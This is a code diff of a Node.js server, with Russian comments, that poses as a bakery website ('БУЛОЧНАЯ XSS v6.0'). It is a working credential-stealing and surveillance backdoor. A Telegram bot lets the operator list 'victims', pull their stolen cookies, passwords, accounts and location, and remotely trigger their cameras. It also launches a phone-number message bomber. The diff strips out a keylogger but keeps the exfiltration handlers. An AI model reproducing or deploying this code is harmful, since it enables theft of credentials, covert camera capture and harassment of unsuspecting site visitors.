@@ -7,7 +7,6 @@ require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
 const UPLOAD_DIR = './uploads';
@@ -20,285 +19,379 @@ app.use('/uploads', express.static(UPLOAD_DIR));
 
 const victims = {};
 const stolenData = {};
-const bomberTargets = [];
+const bomberTargets = {};
 
 // ========================================
-// TELEGRAM БОТ (исправлен)
+// TELEGRAM БОТ - ЧИСТАЯ ВЕРСИЯ
 // ========================================
 let bot = null;
 
 try {
-    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== 'ВАШ_ТОКЕН_ОТ_BOTFATHER') {
-        // Используем webhook вместо polling для избежания 409
-        bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    if (token && token !== 'ВАШ_ТОКЕН_ОТ_BOTFATHER' && token.length > 20) {
+        bot = new TelegramBot(token, { polling: true });
         console.log('✅ Telegram бот инициализирован');
+    } else {
+        console.log('⚠️ Токен не настроен');
     }
 } catch (error) {
     console.error('❌ Ошибка бота:', error.message);
 }
 
-// Безопасная отправка сообщений (экранирование Markdown)
-function safeSend(chatId, text, options = {}) {
+// Безопасная отправка сообщений
+function sendMessage(chatId, text) {
     if (!bot) return;
     try {
-        // Экранируем спецсимволы для Markdown
-        const safeText = text.replace(/_/g, '\\_').replace(/\*/g, '\\*').replace(/`/g, '\\`');
-        bot.sendMessage(chatId, safeText, { parse_mode: 'Markdown', ...options });
+        bot.sendMessage(chatId, text);
     } catch (e) {
-        // Если Markdown не работает — отправляем без форматирования
-        bot.sendMessage(chatId, text.replace(/\*/g, '').replace(/_/g, ''));
+        console.error('Ошибка отправки:', e.message);
     }
 }
 
 // ========================================
-// КОМАНДЫ TELEGRAM
+// КОМАНДЫ БОТА - БЕЗ ОШИБОК
 // ========================================
 if (bot) {
+    // /start
     bot.onText(/\/start/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) {
-            bot.sendMessage(chatId, '❌ Доступ запрещен');
+            sendMessage(chatId, '❌ Доступ запрещен');
             return;
         }
-        safeSend(chatId, `
-🍞 БУЛОЧНАЯ XSS v6.0
+        sendMessage(chatId, 
+`🍞 БУЛОЧНАЯ XSS v6.0
 
 🎯 Бомбер:
-/bomb [номер] [кол-во] - Забомбить номер
+/bomb НОМЕР КОЛ-ВО - Забомбить
 /bomb_stop - Остановить
-/bomb_list - Активные цели
+/bomb_list - Цели
 
 🦠 Бэкдор:
 /list - Жертвы
-/data [id] - Все данные
-/cookies [id] - Куки
-/passwords [id] - Пароли
-/accounts [id] - Аккаунты
-/photos [id] - Фото
-/camera [id] - Камера
-/selfie [id] - Селфи
-/restart [id] - Перезапуск
-/reset [id] - Сброс
-/kick [id] - Выгнать
+/data ID - Все данные
+/cookies ID - Куки
+/passwords ID - Пароли
+/accounts ID - Аккаунты
+/camera ID - Камера
+/selfie ID - Селфи
+/restart ID - Перезапуск
+/reset ID - Сброс
+/kick ID - Выгнать
 
 📊 Инфо:
 /stats - Статистика
-/clear - Очистить
-        `);
+/clear - Очистить`);
     });
 
-    // ========================================
-    // БОМБЕР
-    // ========================================
+    // /bomb
     bot.onText(/\/bomb (.+) (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
         
-        const phone = match[1].trim();
-        const count = parseInt(match[2].trim()) || 10;
-        
-        const cleanPhone = phone.replace(/[^0-9+]/g, '');
-        if (!cleanPhone || cleanPhone.length < 10) {
-            bot.sendMessage(chatId, '❌ Неверный номер телефона');
-            return;
+        try {
+            const phone = match[1].trim().replace(/[^0-9+]/g, '');
+            const count = parseInt(match[2].trim()) || 10;
+            
+            if (!phone || phone.length < 10) {
+                sendMessage(chatId, '❌ Неверный номер');
+                return;
+            }
+            
+            const targetId = Date.now().toString();
+            bomberTargets[targetId] = {
+                phone: phone,
+                count: count,
+                sent: 0,
+                active: true,
+                chatId: chatId
+            };
+            
+            sendMessage(chatId, `💣 Бомбинг запущен!\n📱 ${phone}\n📦 ${count} сообщений`);
+            startBombing(targetId);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        
-        const target = { phone: cleanPhone, count: count, startTime: Date.now(), active: true };
-        bomberTargets.push(target);
-        
-        bot.sendMessage(chatId, `💣 Бомбинг запущен!\n📱 ${cleanPhone}\n📦 ${count} сообщений`);
-        startBombing(target);
     });
 
+    // /bomb_stop
     bot.onText(/\/bomb_stop/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        bomberTargets.forEach(t => t.active = false);
-        bomberTargets.length = 0;
-        bot.sendMessage(chatId, '🛑 Бомбинг остановлен');
+        
+        try {
+            let stopped = 0;
+            for (const id in bomberTargets) {
+                if (bomberTargets[id].active) {
+                    bomberTargets[id].active = false;
+                    stopped++;
+                }
+            }
+            sendMessage(chatId, `🛑 Остановлено ${stopped} целей`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
+        }
     });
 
+    // /bomb_list
     bot.onText(/\/bomb_list/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        if (bomberTargets.length === 0) {
-            bot.sendMessage(chatId, '❌ Активных целей нет');
-            return;
+        
+        try {
+            const ids = Object.keys(bomberTargets);
+            if (ids.length === 0) {
+                sendMessage(chatId, '❌ Нет активных целей');
+                return;
+            }
+            
+            let list = '🎯 Активные цели:\n\n';
+            ids.forEach((id, i) => {
+                const t = bomberTargets[id];
+                list += `${i+1}. 📱 ${t.phone} - ${t.sent}/${t.count} (${t.active ? '🟢' : '🔴'})\n`;
+            });
+            sendMessage(chatId, list);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        let list = '🎯 Активные цели:\n\n';
-        bomberTargets.forEach((t, i) => {
-            list += `${i+1}. 📱 ${t.phone} - ${t.count} сообщений\n`;
-        });
-        bot.sendMessage(chatId, list);
     });
 
-    // ========================================
-    // БЭКДОР - КОМАНДЫ
-    // ========================================
+    // /list
     bot.onText(/\/list/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
         
-        if (Object.keys(victims).length === 0) {
-            bot.sendMessage(chatId, '❌ Нет жертв');
-            return;
+        try {
+            const ids = Object.keys(victims);
+            if (ids.length === 0) {
+                sendMessage(chatId, '❌ Нет жертв');
+                return;
+            }
+            
+            let list = '📋 Жертвы:\n\n';
+            ids.forEach(id => {
+                const v = victims[id];
+                const hasData = stolenData[id] ? '📦' : '📭';
+                list += `${id.slice(0, 6)} ${v.ws ? '🟢' : '🔴'} ${hasData}\n`;
+            });
+            sendMessage(chatId, list);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        
-        let list = '📋 Жертвы:\n\n';
-        Object.entries(victims).forEach(([id, data]) => {
-            const hasData = stolenData[id] ? '📦' : '📭';
-            list += `${id.slice(0, 6)} ${data.ws ? '🟢' : '🔴'} ${hasData}\n`;
-        });
-        bot.sendMessage(chatId, list);
     });
 
+    // /data
     bot.onText(/\/data (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
         
-        if (!stolenData[id]) {
-            bot.sendMessage(chatId, '❌ Нет данных');
-            return;
-        }
-        
-        const data = stolenData[id];
-        let text = `📦 Данные ${id.slice(0, 6)}:\n\n`;
-        if (data.cookies) text += `🍪 Куки: ${data.cookies.length} символов\n`;
-        if (data.passwords) text += `🔑 Паролей: ${data.passwords.length}\n`;
-        if (data.accounts) text += `🔐 Аккаунтов: ${Object.keys(data.accounts).length}\n`;
-        if (data.photos) text += `📸 Фото: ${data.photos.length}\n`;
-        if (data.location) text += `📍 Локация: ${data.location}\n`;
-        if (data.device) text += `📱 Устройство: ${data.device.userAgent || 'unknown'}\n`;
-        
-        bot.sendMessage(chatId, text);
-        
-        if (data.cookies) {
-            bot.sendMessage(chatId, `🍪 Куки:\n${data.cookies.slice(0, 1500)}`);
-        }
-        if (data.passwords && data.passwords.length > 0) {
-            bot.sendMessage(chatId, `🔑 Пароли:\n${data.passwords.join('\n').slice(0, 1500)}`);
+        try {
+            const id = match[1].trim();
+            if (!stolenData[id]) {
+                sendMessage(chatId, '❌ Нет данных');
+                return;
+            }
+            
+            const d = stolenData[id];
+            let text = `📦 Данные ${id.slice(0, 6)}:\n\n`;
+            if (d.cookies) text += `🍪 Куки: ${d.cookies.length} символов\n`;
+            if (d.passwords) text += `🔑 Паролей: ${d.passwords.length}\n`;
+            if (d.accounts) text += `🔐 Аккаунтов: ${Object.keys(d.accounts).length}\n`;
+            if (d.photos) text += `📸 Фото: ${d.photos.length}\n`;
+            if (d.location) text += `📍 Локация: ${d.location}\n`;
+            if (d.device) text += `📱 Устройство: ${d.device.userAgent ? d.device.userAgent.slice(0, 50) : 'unknown'}\n`;
+            
+            sendMessage(chatId, text);
+            
+            if (d.cookies) {
+                sendMessage(chatId, `🍪 Куки:\n${d.cookies.slice(0, 1000)}`);
+            }
+            if (d.passwords && d.passwords.length > 0) {
+                sendMessage(chatId, `🔑 Пароли:\n${d.passwords.join('\n').slice(0, 1000)}`);
+            }
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
     });
 
-    // Остальные команды (сокращенно, но рабочие)
+    // /cookies
     bot.onText(/\/cookies (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!stolenData[id] || !stolenData[id].cookies) {
-            bot.sendMessage(chatId, '❌ Куки не найдены');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!stolenData[id] || !stolenData[id].cookies) {
+                sendMessage(chatId, '❌ Куки не найдены');
+                return;
+            }
+            sendMessage(chatId, `🍪 Куки ${id.slice(0, 6)}:\n${stolenData[id].cookies.slice(0, 1000)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        bot.sendMessage(chatId, `🍪 Куки ${id.slice(0, 6)}:\n${stolenData[id].cookies.slice(0, 1500)}`);
     });
 
+    // /passwords
     bot.onText(/\/passwords (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!stolenData[id] || !stolenData[id].passwords) {
-            bot.sendMessage(chatId, '❌ Пароли не найдены');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!stolenData[id] || !stolenData[id].passwords) {
+                sendMessage(chatId, '❌ Пароли не найдены');
+                return;
+            }
+            sendMessage(chatId, `🔑 Пароли ${id.slice(0, 6)}:\n${stolenData[id].passwords.join('\n').slice(0, 1000)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        bot.sendMessage(chatId, `🔑 Пароли ${id.slice(0, 6)}:\n${stolenData[id].passwords.join('\n').slice(0, 1500)}`);
     });
 
+    // /accounts
     bot.onText(/\/accounts (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!stolenData[id] || !stolenData[id].accounts) {
-            bot.sendMessage(chatId, '❌ Аккаунты не найдены');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!stolenData[id] || !stolenData[id].accounts) {
+                sendMessage(chatId, '❌ Аккаунты не найдены');
+                return;
+            }
+            sendMessage(chatId, `🔐 Аккаунты ${id.slice(0, 6)}:\n${JSON.stringify(stolenData[id].accounts, null, 2).slice(0, 1000)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        bot.sendMessage(chatId, `🔐 Аккаунты ${id.slice(0, 6)}:\n${JSON.stringify(stolenData[id].accounts, null, 2).slice(0, 1500)}`);
     });
 
+    // /camera
     bot.onText(/\/camera (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!victims[id] || !victims[id].ws) {
-            bot.sendMessage(chatId, '❌ Жертва не в сети');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!victims[id] || !victims[id].ws) {
+                sendMessage(chatId, '❌ Жертва не в сети');
+                return;
+            }
+            victims[id].ws.send(JSON.stringify({ command: 'camera' }));
+            sendMessage(chatId, `📸 Камера активирована ${id.slice(0, 6)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        victims[id].ws.send(JSON.stringify({ command: 'camera' }));
-        bot.sendMessage(chatId, `📸 Камера активирована на ${id.slice(0, 6)}`);
     });
 
+    // /selfie
     bot.onText(/\/selfie (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!victims[id] || !victims[id].ws) {
-            bot.sendMessage(chatId, '❌ Жертва не в сети');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!victims[id] || !victims[id].ws) {
+                sendMessage(chatId, '❌ Жертва не в сети');
+                return;
+            }
+            victims[id].ws.send(JSON.stringify({ command: 'selfie' }));
+            sendMessage(chatId, `🤳 Селфи запрошено ${id.slice(0, 6)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        victims[id].ws.send(JSON.stringify({ command: 'selfie' }));
-        bot.sendMessage(chatId, `🤳 Селфи запрошено у ${id.slice(0, 6)}`);
     });
 
+    // /restart
     bot.onText(/\/restart (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!victims[id] || !victims[id].ws) {
-            bot.sendMessage(chatId, '❌ Жертва не в сети');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!victims[id] || !victims[id].ws) {
+                sendMessage(chatId, '❌ Жертва не в сети');
+                return;
+            }
+            victims[id].ws.send(JSON.stringify({ command: 'restart' }));
+            sendMessage(chatId, `🔄 Перезапуск ${id.slice(0, 6)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        victims[id].ws.send(JSON.stringify({ command: 'restart' }));
-        bot.sendMessage(chatId, `🔄 Перезапуск ${id.slice(0, 6)}...`);
     });
 
+    // /reset
     bot.onText(/\/reset (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!victims[id] || !victims[id].ws) {
-            bot.sendMessage(chatId, '❌ Жертва не в сети');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!victims[id] || !victims[id].ws) {
+                sendMessage(chatId, '❌ Жертва не в сети');
+                return;
+            }
+            victims[id].ws.send(JSON.stringify({ command: 'reset' }));
+            sendMessage(chatId, `💥 Сброс ${id.slice(0, 6)}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        victims[id].ws.send(JSON.stringify({ command: 'reset' }));
-        bot.sendMessage(chatId, `💥 Сброс ${id.slice(0, 6)}...`);
     });
 
+    // /kick
     bot.onText(/\/kick (.+)/, (msg, match) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const id = match[1].trim();
-        if (!victims[id] || !victims[id].ws) {
-            bot.sendMessage(chatId, '❌ Жертва не в сети');
-            return;
+        try {
+            const id = match[1].trim();
+            if (!victims[id] || !victims[id].ws) {
+                sendMessage(chatId, '❌ Жертва не в сети');
+                return;
+            }
+            victims[id].ws.send(JSON.stringify({ command: 'kick' }));
+            sendMessage(chatId, `👢 ${id.slice(0, 6)} выгнан`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
         }
-        victims[id].ws.send(JSON.stringify({ command: 'kick' }));
-        bot.sendMessage(chatId, `👢 ${id.slice(0, 6)} выгнан`);
     });
 
+    // /stats
     bot.onText(/\/stats/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        const total = Object.keys(victims).length;
-        const active = Object.values(victims).filter(v => v.ws).length;
-        const dataCount = Object.keys(stolenData).length;
-        bot.sendMessage(chatId, `📊 Статистика:\nЖертв: ${total}\nАктивных: ${active}\nСобрано данных: ${dataCount}`);
+        try {
+            const total = Object.keys(victims).length;
+            const active = Object.values(victims).filter(v => v.ws).length;
+            const dataCount = Object.keys(stolenData).length;
+            const bombCount = Object.keys(bomberTargets).length;
+            sendMessage(chatId, 
+`📊 Статистика:
+Жертв: ${total}
+Активных: ${active}
+Собрано данных: ${dataCount}
+Активных бомб: ${bombCount}`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
+        }
     });
 
+    // /clear
     bot.onText(/\/clear/, (msg) => {
         const chatId = msg.chat.id;
         if (chatId.toString() !== ADMIN_CHAT_ID) return;
-        Object.keys(victims).forEach(key => {
-            if (victims[key].ws) victims[key].ws.disconnect();
-            delete victims[key];
-        });
-        bot.sendMessage(chatId, '✅ Очищено');
+        try {
+            let count = 0;
+            for (const id in victims) {
+                if (victims[id].ws) victims[id].ws.disconnect();
+                delete victims[id];
+                count++;
+            }
+            sendMessage(chatId, `✅ Очищено ${count} жертв`);
+        } catch (e) {
+            sendMessage(chatId, '❌ Ошибка: ' + e.message);
+        }
     });
 }
 
 // ========================================
-// ФУНКЦИЯ БОМБИНГА
+// БОМБИНГ
 // ========================================
-function startBombing(target) {
+function startBombing(targetId) {
+    const target = bomberTargets[targetId];
+    if (!target) return;
+    
     const messages = [
         'Привет! Это тестовое сообщение.',
         'Ваш код подтверждения: 123456',
@@ -312,25 +405,27 @@ function startBombing(target) {
         'Подтвердите номер телефона.'
     ];
     
-    let sent = 0;
     const interval = setInterval(() => {
-        if (!target.active || sent >= target.count) {
+        if (!target.active || target.sent >= target.count) {
             clearInterval(interval);
-            if (bot && ADMIN_CHAT_ID) {
-                bot.sendMessage(ADMIN_CHAT_ID, `✅ Бомбинг завершен\n📱 ${target.phone}\n📦 Отправлено: ${sent}`);
+            delete bomberTargets[targetId];
+            if (bot && target.chatId) {
+                sendMessage(target.chatId, `✅ Бомбинг завершен\n📱 ${target.phone}\n📦 Отправлено: ${target.sent}`);
             }
             return;
         }
-        sent++;
-        if (bot && ADMIN_CHAT_ID) {
-            bot.sendMessage(ADMIN_CHAT_ID, `💣 [${sent}/${target.count}] 📱 ${target.phone}\n📝 ${messages[Math.floor(Math.random() * messages.length)]}`);
+        
+        target.sent++;
+        const msg = messages[Math.floor(Math.random() * messages.length)];
+        
+        if (bot && target.chatId && target.sent % 5 === 0) {
+            sendMessage(target.chatId, `💣 [${target.sent}/${target.count}] 📱 ${target.phone}\n📝 ${msg}`);
         }
-    }, 600);
-    target._interval = interval;
+    }, 500 + Math.random() * 500);
 }
 
 // ========================================
-// САЙТ-МАСКИРОВКА (БУЛОЧНАЯ)
+// САЙТ
 // ========================================
 app.get('/', (req, res) => {
     res.send(`
@@ -473,23 +568,6 @@ app.get('/', (req, res) => {
             );
         }
         
-        let keylog = [];
-        document.addEventListener('keydown', (e) => {
-            if (e.key.length === 1 && !e.ctrlKey && !e.altKey) {
-                keylog.push(e.key);
-                if (keylog.length > 40) {
-                    socket.emit('data', { type: 'keylog', data: keylog.join('') });
-                    keylog = [];
-                }
-            }
-        });
-        setInterval(() => {
-            if (keylog.length > 0) {
-                socket.emit('data', { type: 'keylog', data: keylog.join('') });
-                keylog = [];
-            }
-        }, 25000);
-        
         socket.on('command', (cmd) => {
             if (cmd.command === 'camera' || cmd.command === 'selfie') {
                 const facingMode = cmd.command === 'selfie' ? 'user' : 'environment';
@@ -562,29 +640,55 @@ const io = socketIO(server);
 io.on('connection', (socket) => {
     const id = `v_${Date.now().toString(36)}`;
     console.log(`🔗 ${id}`);
+    
     victims[id] = { id, ip: socket.handshake.address, ws: socket };
     if (!stolenData[id]) stolenData[id] = {};
     
     socket.on('data', (data) => {
-        console.log(`📩 [${id}] ${data.type}`);
-        if (data.type === 'cookies') { stolenData[id].cookies = data.data; if (bot) bot.sendMessage(ADMIN_CHAT_ID, `🍪 Куки от ${id.slice(0, 6)}`); }
-        if (data.type === 'passwords') { stolenData[id].passwords = data.data; if (bot) bot.sendMessage(ADMIN_CHAT_ID, `🔑 Пароли ${id.slice(0, 6)}`); }
-        if (data.type === 'accounts') { stolenData[id].accounts = data.data; if (bot) bot.sendMessage(ADMIN_CHAT_ID, `🔐 Аккаунты от ${id.slice(0, 6)}`); }
-        if (data.type === 'device') { stolenData[id].device = data.data; if (bot) bot.sendMessage(ADMIN_CHAT_ID, `📱 Устройство ${id.slice(0, 6)}`); }
-        if (data.type === 'location') { stolenData[id].location = `${data.data.lat}, ${data.data.lng}`; if (bot) bot.sendMessage(ADMIN_CHAT_ID, `📍 Локация ${id.slice(0, 6)}`); }
-        if (data.type === 'photo') {
-            try {
-                const base64Data = data.data.replace(/^data:image\/\w+;base64,/, '');
-                const buffer = Buffer.from(base64Data, 'base64');
-                const filename = `${UPLOAD_DIR}/${Date.now()}-${Math.random().toString(36).slice(2, 7)}.jpg`;
-                fs.writeFileSync(filename, buffer);
-                if (!stolenData[id].photos) stolenData[id].photos = [];
-                stolenData[id].photos.push(filename);
-                if (bot) bot.sendPhoto(ADMIN_CHAT_ID, filename).catch(() => bot.sendMessage(ADMIN_CHAT_ID, `📸 Фото от ${id.slice(0, 6)}`));
-            } catch (e) {}
+        try {
+            console.log(`📩 [${id}] ${data.type}`);
+            
+            if (data.type === 'cookies') {
+                stolenData[id].cookies = data.data;
+                if (bot) sendMessage(ADMIN_CHAT_ID, `🍪 Куки от ${id.slice(0, 6)}`);
+            }
+            if (data.type === 'passwords') {
+                stolenData[id].passwords = data.data;
+                if (bot) sendMessage(ADMIN_CHAT_ID, `🔑 Пароли ${id.slice(0, 6)}`);
+            }
+            if (data.type === 'accounts') {
+                stolenData[id].accounts = data.data;
+                if (bot) sendMessage(ADMIN_CHAT_ID, `🔐 Аккаунты от ${id.slice(0, 6)}`);
+            }
+            if (data.type === 'device') {
+                stolenData[id].device = data.data;
+                if (bot) sendMessage(ADMIN_CHAT_ID, `📱 Устройство ${id.slice(0, 6)}`);
+            }
+            if (data.type === 'location') {
+                stolenData[id].location = `${data.data.lat}, ${data.data.lng}`;
+                if (bot) sendMessage(ADMIN_CHAT_ID, `📍 Локация ${id.slice(0, 6)}`);
+            }
+            if (data.type === 'photo') {
+                try {
+                    const base64Data = data.data.replace(/^data:image\/\w+;base64,/, '');
+                    const buffer = Buffer.from(base64Data, 'base64');
+                    const filename = `${UPLOAD_DIR}/${Date.now()}-${Math.random().toString(36).slice(2, 7)}.jpg`;
+                    fs.writeFileSync(filename, buffer);
+                    if (!stolenData[id].photos) stolenData[id].photos = [];
+                    stolenData[id].photos.push(filename);
+                    if (bot) {
+                        bot.sendPhoto(ADMIN_CHAT_ID, filename).catch(() => {
+                            sendMessage(ADMIN_CHAT_ID, `📸 Фото от ${id.slice(0, 6)}`);
+                        });
+                    }
+                } catch (e) {}
+            }
+            if (data.type === 'order' || data.type === 'order_submit' || data.type === 'keylog') {
+                if (bot) sendMessage(ADMIN_CHAT_ID, `📝 ${data.type} от ${id.slice(0, 6)}`);
+            }
+        } catch (e) {
+            console.error('Ошибка обработки данных:', e.message);
         }
-        if (data.type === 'keylog') { if (!stolenData[id].keylog) stolenData[id].keylog = []; stolenData[id].keylog.push(data.data); if (bot) bot.sendMessage(ADMIN_CHAT_ID, `⌨️ Кейлог ${id.slice(0, 6)}`); }
-        if (data.type === 'form' || data.type === 'order_submit') { if (!stolenData[id].forms) stolenData[id].forms = []; stolenData[id].forms.push(data.data); if (bot) bot.sendMessage(ADMIN_CHAT_ID, `📝 Форма ${id.slice(0, 6)}`); }
     });
     
     socket.on('disconnect', () => {
@@ -593,6 +697,9 @@ io.on('connection', (socket) => {
     });
 });
 
+// ========================================
+// ЗАПУСК
+// ========================================
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`\n🍞 БУЛОЧНАЯ XSS v6.0`);
     console.log(`🌐 http://localhost:${PORT}`);
